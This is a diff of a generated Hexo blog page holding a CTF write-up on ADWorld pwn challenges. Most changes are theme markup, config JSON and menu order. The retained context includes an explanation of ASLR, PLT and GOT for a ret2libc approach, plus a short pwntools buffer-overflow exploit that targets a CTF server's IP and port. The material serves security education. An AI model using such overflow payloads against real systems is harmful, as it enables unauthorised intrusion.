@@ -35,10 +35,10 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/img/wang.svg","avatar":"/img/aliwangwang.svg","first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":true},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Gamer","Learner"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"version":"3.8.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2018,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
-    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
   </script>
 <meta name="generator" content="Hexo 5.4.2"></head>
 
@@ -46,13 +46,15 @@
 <body>
 <div class="progress-bar-container">
     
+        <span class="scroll-progress-bar"></span>
+    
 
     
 </div>
 
 
-<main class="page-container border-box">
 
+<main class="page-container border-box">
     <!-- home first screen  -->
     
 
@@ -78,49 +80,59 @@
             <div class="pc">
                 <ul class="menu-list">
                     
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/"
                             >
+                                
                                 HOME
                             </a>
                         </li>
                     
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/archives"
                             >
+                                
                                 ARCHIVES
                             </a>
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
-                                CATEGORIES
-                            </a>
-                        </li>
-                    
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/tags"
                             >
+                                
                                 TAGS
                             </a>
                         </li>
                     
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        
                         <li class="menu-item">
                             <a class=""
                                href="/about"
                             >
+                                
                                 ABOUT
                             </a>
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
+                            <i class="fas search fa-search"></i>
                         </li>
                     
                 </ul>
@@ -139,29 +151,39 @@
     <div class="header-drawer">
         <ul class="drawer-menu-list">
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/">HOME</a>
+                       href="/"
+                    >HOME</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/archives">ARCHIVES</a>
+                       href="/archives"
+                    >ARCHIVES</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/categories">CATEGORIES</a>
+                       href="/tags"
+                    >TAGS</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/tags">TAGS</a>
+                       href="/categories"
+                    >CATEGORIES</a>
                 </li>
             
+                
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/about">ABOUT</a>
+                       href="/about"
+                    >ABOUT</a>
                 </li>
             
         </ul>
@@ -177,61 +199,57 @@
         <div class="page-main-content-middle border-box">
 
             <div class="main-content border-box">
-
                 
 
-                    <div class="fade-in-down-animation">
+                    
+<div class="fade-in-down-animation">
     <div class="post-page-container border-box">
-
-        <div class="article-content-container border-box">
-
+        <div class="post-content-container border-box">
             
 
-            <div class="article-content-bottom border-box">
+            <div class="post-content-bottom border-box">
                 
-                    <div class="article-title">
+                    <div class="post-title">
                         ADWorld PWN Exercise Area Write-ups
                     </div>
                 
 
                 
-                    <div class="article-header border-box">
+                    <div class="post-header border-box">
                         
                             <div class="avatar-box border-box">
                                 <img src="/img/aliwangwang.svg">
                             </div>
                         
                         <div class="info-box">
-                            <div class="author">
+                            <div class="author border-box">
                                 <span class="name">TyeYeah</span>
                                 
-                                    <span class="author-label">Lv4</span>
+                                    <span class="author-badge">Lv4</span>
                                 
                             </div>
                             <div class="meta-info border-box">
                                 
 
-<div class="article-meta-info-container border-box post">
-    <div class="article-meta-info border-box">
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
         
 
-
         
-            <span class="meta-info-item article-create-date">
-                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
-                <span class="pc">2020-07-24 22:37:54</span>
-                <span class="mobile">2020-07-24 22:37</span>
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2020-07-24 22:37:54</span>
             </span>
 
-            <span class="meta-info-item article-update-date">
+            <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="pc" data-updated="Wed Oct 14 2020 19:11:12 GMT+0800">2020-10-14 19:11:12</span>
+                <span class="datetime" data-updated="Wed Oct 14 2020 19:11:12 GMT+0800">2020-10-14 19:11:12</span>
             </span>
         
 
         
-            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
-                <ul class="article-category-ul">
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
                     
                             <li class="category-item"><a href="/categories/CTF/">CTF</a></li>
                         
@@ -241,9 +259,8 @@
         
 
         
-            <span class="article-tag meta-info-item border-box">
-                <i class="icon fas fa-tags"></i>&nbsp;
-                <ul class="article-tag-ul">
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
                     
                             <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/pwn/">pwn</a></li>
                         
@@ -266,12 +283,12 @@
 
         
         
-            <span class="meta-info-item article-wordcount">
+            <span class="meta-info-item post-wordcount">
                 <i class="icon fas fa-file-word"></i>&nbsp;<span>4.8k Words</span>
             </span>
         
         
-            <span class="meta-info-item article-min2read">
+            <span class="meta-info-item post-min2read">
                 <i class="icon fas fa-clock"></i>&nbsp;<span>30 Mins</span>
             </span>
         
@@ -286,7 +303,7 @@
                     </div>
                 
 
-                <div class="article-content keep-markdown-body">
+                <div class="post-content keep-markdown-body">
                     
 
                     <p>You can find all the following challenges on <a class="link"   target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/task_list?type=pwn&number=2&grade=0" >World of Attack &amp; Defense (ADWorld)<i class="fas fa-external-link-alt"></i></a>, which is a CN CTF platform and not so international (All Chinese challenge descriptions). </p>
@@ -409,7 +426,7 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
 <p>As description says, we have no <code>system</code>, but we get target <code>libc</code> – file <code>libc_32.so.6</code>.<br>Though <code>ASLR</code> randomizes base addresses, the functions’ offset relative to the base address of the <code>libc</code> is constant. So we use <code>write</code> to get current <code>write</code> function address, and calculate <code>system</code> current address depending on this.</p>
 <p>Real <code>system</code> address is in <code>GOT</code> (global offset table), but when calling <code>system</code> we call <code>PLT</code> (procedure linkage table). About <code>PLT</code> and <code>GOT</code> u can check <a class="link"   target="_blank" rel="noopener" href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" >This Link<i class="fas fa-external-link-alt"></i></a> for details.</p>
 <ul>
-<li>The normal function call goes following the order of black, red and blue.<br><img src="/imghost/apeaw/PLT_GOT.png" alt="PLT_GOT"></li>
+<li>The normal function call goes following the order of black, red and blue.<br><img   src="/imghost/apeaw/PLT_GOT.png"  alt="PLT_GOT"></li>
 <li>To be more specific, the first call runs <code>dl_runtime_resolve</code> first to prepare:<br>![First Call](&#x2F;imghost&#x2F;apeaw&#x2F;1st call.jpg)</li>
 <li>And subsequent calls are easier:<br>![Second Call](&#x2F;imghost&#x2F;apeaw&#x2F;2nd call.jpg)</li>
 </ul>
@@ -426,7 +443,6 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
 <p>Exploit:</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./int&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">33616</span>)</span><br><span class="line">what_is_this_addr = <span class="number">0x0804868B</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">payload = <span class="number">0x14</span> * <span class="string">&#x27;a&#x27;</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(what_is_this_addr) + <span class="string">&#x27;c&#x27;</span> * <span class="number">234</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
                 </div>
-
                 
 
                 <div class="post-bottom-tags-and-share border-box">
@@ -465,18 +481,18 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
                 
 
                 
-                    <div class="article-nav">
+                    <div class="post-nav border-box">
                         
-                            <div class="article-prev">
+                            <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
                                    href="/2020/07/29/2020-07-29-ADWorld-PWN-Challenge-Area-Write-ups-ret2text/"
                                    title="ADWorld PWN Challenge Area Write-ups (ret2text)"
                                 >
                                     <span class="left arrow-icon flex-center">
-                                      <i class="fas fa-chevron-left"></i>
+                                        <i class="fas fa-chevron-left"></i>
                                     </span>
-                                            <span class="title flex-center">
+                                    <span class="title flex-center">
                                         <span class="post-nav-title-item text-ellipsis">ADWorld PWN Challenge Area Write-ups (ret2text)</span>
                                         <span class="post-nav-item">Prev posts</span>
                                     </span>
@@ -484,7 +500,7 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
                             </div>
                         
                         
-                            <div class="article-next">
+                            <div class="next-post">
                                 <a class="next"
                                    rel="next"
                                    href="/2020/07/16/2020-07-16-Integer-Overflow-Intro/"
@@ -494,8 +510,8 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
                                         <span class="post-nav-title-item text-ellipsis">Integer Overflow Intro</span>
                                         <span class="post-nav-item">Next posts</span>
                                     </span>
-                                            <span class="right arrow-icon flex-center">
-                                      <i class="fas fa-chevron-right"></i>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
                                     </span>
                                 </a>
                             </div>
@@ -531,7 +547,6 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
 
                 
             </div>
-
         </div>
 
         <div class="page-main-content-bottom border-box">
@@ -587,6 +602,11 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
 
         <!-- PC go comment -->
         
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
     </ul>
 </div>
 
@@ -605,7 +625,7 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-dark-light-toggle flex-center">
+        <li class="tools-item tool-toggle-theme-mode flex-center">
             <i class="fas fa-moon"></i>
         </li>
 
@@ -702,7 +722,9 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
 
 <script src="/js/back2top.js"></script>
 
-<script src="/js/dark-light-toggle.js"></script>
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
 
 <script src="/js/main.js"></script>
 
@@ -713,13 +735,6 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
 
     
 <script src="/js/local-search.js"></script>
-
-
-
-<!-- code-block -->
-
-    
-<script src="/js/code-block.js"></script>
 
 
 
@@ -747,10 +762,16 @@ unsigned int seed[2]; // [rsp+30h] [rbp-10h]
         
     
 
-    <!-- category-page -->
+    <!-- categories page -->
     
 
-    <!-- links-page -->
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
     
 </div>
 
